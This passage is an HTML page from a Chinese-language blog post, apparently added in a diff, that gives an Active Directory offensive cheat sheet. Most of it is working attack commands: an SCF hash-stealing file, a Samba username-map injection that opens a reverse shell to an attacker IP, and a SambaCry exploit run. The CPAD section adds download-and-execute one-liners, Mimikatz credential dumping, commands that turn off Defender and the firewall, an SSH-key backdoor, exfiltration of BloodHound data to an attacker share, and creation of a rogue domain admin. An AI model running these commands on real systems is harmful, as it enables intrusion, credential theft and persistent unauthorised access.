class="hljs-literal">-o</span> <span class="hljs-string">&#x27;vers=2.0&#x27;</span> <span class="hljs-comment">## can be change to vers=1.0 and vers=3.0</span><br><span class="hljs-literal">-o</span> <span class="hljs-string">&#x27;dir_mode=0755,file_mode=0755&#x27;</span><br><br><span class="hljs-comment">## ------------------| Usage of Thunar </span><br>thunar smb://<span class="hljs-variable">$IP</span>/<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>通过远程共享在Kali Linux上挂载VHD文件</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell">apt<span class="hljs-literal">-get</span> install libguestfs<span class="hljs-literal">-tools</span><br>apt<span class="hljs-literal">-get</span> install cifs<span class="hljs-literal">-utils</span><br><br>guestmount <span class="hljs-literal">--add</span> /mnt/remote/path/to/vhdfile.vhd <span class="hljs-literal">--inspector</span> <span class="hljs-literal">--ro</span> /mnt/vhd <span class="hljs-literal">-v</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>SCF 文件攻击</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Create payload nano stealhash.scf </span><br>[<span class="hljs-type">Shell</span>]<br>Command=<span class="hljs-number">2</span><br>IconFile=\\&lt;YourP&gt;\share\h4rithd.ico<br>[<span class="hljs-type">Taskbar</span>]<br>Command=ToggleDesktop<br><br><span class="hljs-comment">## ------------------| Start responder </span><br>responder <span class="hljs-literal">-I</span> tun0<br><span class="hljs-comment"># Then copy the scf file to users desktop</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>从 AD 中获取已删除的项目</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Get-ADObject</span> <span class="hljs-literal">-SearchBase</span> <span class="hljs-string">&quot;CN=Deleted Objects,DC=Cascade,DC=Local&quot;</span> <span class="hljs-literal">-Filter</span> &#123;ObjectClass <span class="hljs-operator">-eq</span> <span class="hljs-string">&quot;user&quot;</span>&#125; <span class="hljs-literal">-IncludeDeletedObjects</span> <span class="hljs-literal">-Properties</span> *    <br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>如果你得到<code>STATUS_PASSWORD_MUST_CHANGE</code>;重置SMB密码</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| If you are from linux env</span><br>smbpasswd <span class="hljs-literal">-U</span> &lt;UserName&gt; <span class="hljs-literal">-r</span> &lt;RemoteMachineIP&gt;<br><br><span class="hljs-comment">## ------------------| If you are from Windows env (Powershell)</span><br><span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;phinchley&#x27;</span><br><span class="hljs-variable">$dc</span> = <span class="hljs-string">&#x27;dc.lab.hinchley.net&#x27;</span><br><br><span class="hljs-variable">$old</span> = <span class="hljs-string">&#x27;Passw0rd1#&#x27;</span><br><span class="hljs-variable">$new</span> = <span class="hljs-string">&#x27;Something!&#x27;</span><br><br><span class="hljs-variable">$code</span> = <span class="hljs-string">@&#x27;</span><br><span class="hljs-string">[DllImport(&quot;netapi32.dll&quot;, CharSet = CharSet.Unicode)]</span><br><span class="hljs-string">public static extern bool NetUserChangePassword(string domain, string username, string oldpassword, string newpassword);</span><br><span class="hljs-string">&#x27;@</span><br><br><span class="hljs-variable">$NetApi32</span> = <span class="hljs-built_in">Add-Type</span> <span class="hljs-literal">-MemberDefinition</span> <span class="hljs-variable">$code</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&#x27;NetApi32&#x27;</span> <span class="hljs-literal">-Namespace</span> <span class="hljs-string">&#x27;Win32&#x27;</span> <span class="hljs-literal">-PassThru</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span> = <span class="hljs-variable">$NetApi32::NetUserChangePassword</span>(<span class="hljs-variable">$dc</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$old</span>, <span class="hljs-variable">$new</span>)) &#123;<br>  <span class="hljs-built_in">write-host</span> <span class="hljs-string">&#x27;Password change failed.&#x27;</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-built_in">write-host</span> <span class="hljs-string">&#x27;Password change successful.&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><p><a target="_blank" rel="noopener" href="https://wizard32.net/blog/knock-and-pass-kerberos-exploitation.html">敲击并通过：Kerberos 漏洞利用</a></p>
+</li>
+<li><p>Samba 3.0.20 &lt; 3.0.25rc3 - “用户名”映射脚本 (CVE 2007-2447)</p>
+</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">crackmapexec smb <span class="hljs-literal">--shares</span> &lt;IP&gt; <span class="hljs-literal">-u</span> <span class="hljs-string">&#x27;./=`nohup nc -e /bin/sh 10.10.14.17 4545`&#x27;</span> <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>桑巴哭泣 | CVE-2017-7494 | 3.5.0 和 3.6.0</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Setup</span><br>git clone https://github.com/opsxcq/exploit<span class="hljs-literal">-CVE-2017-7494</span> &amp;&amp; exploit<span class="hljs-literal">-CVE-2017-7494</span><br>sudo pip install virtualenv<br>virtualenv <span class="hljs-literal">-p</span> python2 venv<br>source venv/bin/activate<br>pip2 install impacket<br><br><span class="hljs-comment">## ------------------| Expolit</span><br>python ./exploit.py <span class="hljs-literal">-t</span> <span class="hljs-variable">$IP</span> <span class="hljs-literal">-e</span> libbindshell<span class="hljs-literal">-samba</span>.so  <span class="hljs-literal">-s</span> SusieShare <span class="hljs-literal">-r</span> /SusieShare/libbindshell<span class="hljs-literal">-samba</span>.so <span class="hljs-literal">-u</span> admin <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-literal">-P</span> <span class="hljs-number">6699</span>   <br></code></pre></td></tr></table></figure>
+
+<h2 id="04-CPAD-命令圣经"><a href="#04-CPAD-命令圣经" class="headerlink" title="04.CPAD 命令圣经"></a>04.CPAD 命令圣经</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta"># https:<span class="hljs-comment">//github.com/Spartan-Cybersecurity/CPAD-Tools</span></span><br><br>python3 -c <span class="hljs-string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br>echo <span class="hljs-string">&quot;ssh-rsa AAAAB3NzaC1= root@kali&quot;</span> &gt;&gt; ~/.ssh/authorized_keys<br><br>certutil.exe -f -urlcache -split http:<span class="hljs-comment">//192.168.49.123/bypass.exe</span><br>bitsadmin /transfer myJob http:<span class="hljs-comment">//192.168.49.123/EjecutaEsto.exe C:\\Windows\\Tasks\\EjecutaEsto.exe</span><br><br>IEX (New-Object Net.WebClient).DownloadString(<span class="hljs-string">&#x27;http://192.168.49.123/PowerView.ps1&#x27;</span>);<br>certutil.exe -f -urlcache -split http:<span class="hljs-comment">//192.168.49.123/HeidiSQL.zip</span><br>IEX (New-Object Net.WebClient).DownloadString(<span class="hljs-string">&#x27;http://192.168.49.123/PowerUpSQL.ps1&#x27;</span>);<br>Get-SQLInstanceDomain | Get-SQLConnectionTest<br>Get-SQLServerLink -Instance localhost <br>Invoke-SQLAudit -Instance localhost<br><br><span class="hljs-title function_">IEX</span> <span class="hljs-params">(New-Object Net.WebClient)</span>.<span class="hljs-title function_">DownloadString</span><span class="hljs-params">(<span class="hljs-string">&#x27;http://192.168.49.123/Invoke-Mimikatz.ps1&#x27;</span>)</span>;<br>Invoke-Mimikatz -Command <span class="hljs-string">&#x27;&quot;token::elevate&quot; &quot;sekurlsa::logonpasswords&quot; &quot;lsadump::sam&quot; &quot;lsadump::secrets&quot;&#x27;</span><br>certutil.exe -f -urlcache -split http:<span class="hljs-comment">//192.168.49.123/mimikatz.exe</span><br>.\mimikatz.exe <span class="hljs-string">&#x27;privilege::debug&#x27;</span> <span class="hljs-string">&#x27;token::elevate&#x27;</span> <span class="hljs-string">&#x27;sekurlsa::logonpasswords&#x27;</span> <span class="hljs-string">&#x27;lsadump::sam&#x27;</span> <span class="hljs-string">&#x27;lsadump::secrets&#x27;</span> <span class="hljs-built_in">exit</span> <br><br><span class="hljs-title function_">IEX</span> <span class="hljs-params">(New-Object Net.WebClient)</span>.<span class="hljs-title function_">DownloadString</span><span class="hljs-params">(<span class="hljs-string">&#x27;http://192.168.49.123/adPEAS-Light.ps1&#x27;</span>)</span>; Invoke-adPeas -Outputfile result-adpeas.txt<br><span class="hljs-title function_">IEX</span> <span class="hljs-params">(New-Object Net.WebClient)</span>.<span class="hljs-title function_">DownloadString</span><span class="hljs-params">(<span class="hljs-string">&#x27;http://192.168.49.123/SharpHound.ps1&#x27;</span>)</span>; <br>Invoke-BloodHound -CollectionMethod All -Domain spartancybersec.corp -ZipFileName luna.zip<br><br><br>(New-Object System.Net.WebClient).DownloadFile(<span class="hljs-string">&#x27;http://192.168.49.123/PsExec64.exe&#x27;</span>, <span class="hljs-string">&#x27;c:\Users\Public\PsExec64.exe&#x27;</span>)<br>(New-Object System.Net.WebClient).DownloadFile(<span class="hljs-string">&#x27;http://192.168.49.123/PetitPotato.exe&#x27;</span>, <span class="hljs-string">&#x27;c:\Users\Public\PetitPotato.exe&#x27;</span>)<br><br>certutil.exe -f -urlcache -split http:<span class="hljs-comment">//192.168.49.123/SharpHound.exe</span><br>.\SharpHound.exe --CollectionMethods All --Domain spartancybersec.corp<br><br>Set-MpPreference -DisableIOAVProtection $<span class="hljs-literal">true</span> -Verbose<br>Set-MpPreference -DisableRealtimeMonitoring $<span class="hljs-literal">true</span> -Verbose<br>Get-MpPreference | select DisableIOAVProtection, DisableRealtimeMonitoring<br>Set-NetFirewallProfile -name Domain,Private,Public -Enabled False -Verbose<br>netsh advfirewall <span class="hljs-built_in">set</span> allprofiles state off<br><br>New-ItemProperty -Path <span class="hljs-string">&quot;HKLM:\System\CurrentControlSet\Control\Lsa&quot;</span> -Name <span class="hljs-string">&quot;DisableRestrictedAdmin&quot;</span> -Value <span class="hljs-string">&quot;0&quot;</span> -PropertyType DWORD -Force<br><br>net use \\<span class="hljs-number">192.168</span><span class="hljs-number">.49</span><span class="hljs-number">.123</span>\kali-share /u:kali kali<br>copy \\<span class="hljs-number">192.168</span><span class="hljs-number">.49</span><span class="hljs-number">.123</span>\kali-share\BypassCLM-bin.exe .<br>copy <span class="hljs-number">20230915084901</span>_BloodHound.zip \\<span class="hljs-number">192.168</span><span class="hljs-number">.49</span><span class="hljs-number">.123</span>\kali-share\<br><br>iwr -uri http:<span class="hljs-comment">//192.168.49.123/chisel.exe -o c:\windows\tasks\chisel.exe</span><br>c:\windows\tasks\chisel.exe client <span class="hljs-number">192.168</span><span class="hljs-number">.49</span><span class="hljs-number">.123</span>:<span class="hljs-number">9090</span> R:<span class="hljs-number">9050</span>:socks<br><br>iwr -uri http:<span class="hljs-comment">//192.168.49.123/NimScan.exe -o c:\windows\tasks\NimScan.exe</span><br>c:\windows\tasks\NimScan.exe <br><br><span class="hljs-title function_">IEX</span> <span class="hljs-params">(New-Object Net.WebClient)</span>.<span class="hljs-title function_">DownloadString</span><span class="hljs-params">(<span class="hljs-string">&#x27;import-module https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1&#x27;</span>)</span>;<br>IEX (New-Object Net.WebClient).DownloadString(<span class="hljs-string">&#x27;http://192.168.49.123/Invoke-Portscan.ps1&#x27;</span>);<br>Get-DomainComputer -Properties cn | select -first <span class="hljs-number">8</span> | %&#123;Invoke-Portscan -Hosts $_.cn -TopPorts <span class="hljs-number">50</span> -Threads <span class="hljs-number">4</span>&#125;<br><br>iwr -uri http:<span class="hljs-comment">//192.168.49.123/NimScan.exe -o c:\windows\tasks\NimScan.exe</span><br><br>IEX (New-Object Net.WebClient).DownloadString(<span class="hljs-string">&#x27;http://192.168.49.123/winPEAS.ps1&#x27;</span>);<br>iwr -uri http:<span class="hljs-comment">//192.168.49.123/winPEASany.exe -o c:\windows\tasks\winPEASany.exe</span><br>IEX (New-Object Net.WebClient).DownloadString(<span class="hljs-string">&#x27;http://192.168.49.123/PowerUp.ps1&#x27;</span>)<br><br><br>net user sephiroth Pass123 /add /domain<br>net localgroup Administrators sephiroth /add /domain<br>net localgroup <span class="hljs-string">&#x27;Remote Desktop Users&#x27;</span> sephiroth /add /domain<br>net group <span class="hljs-string">&#x27;Domain Admins&#x27;</span> sephiroth /add<br>net group <span class="hljs-string">&#x27;Enterprise Admins&#x27;</span> sephiroth /add<br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="category-chain-item">学习笔记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Offensive-security/" class="print-no-link">#Offensive security</a>
+      
+        <a href="/tags/Active-Directory/" class="print-no-link">#Active Directory</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>活动目录-技术实现-h4rithd-2024.04.03版本</div>
+      <div>https://sh1yan.top/2024/06/02/Active-Directory-Technical-Implementation-h4rithd-20240403/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>shiyan</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年6月2日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/06/02/Common-Linux-commands-horizontal-movement-h4rithd-20240403/" title="Linux常用命令-横向移动-h4rithd-2024.04.03版本">
+                        <span class="hidden-mobile">Linux常用命令-横向移动-h4rithd-2024.04.03版本</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
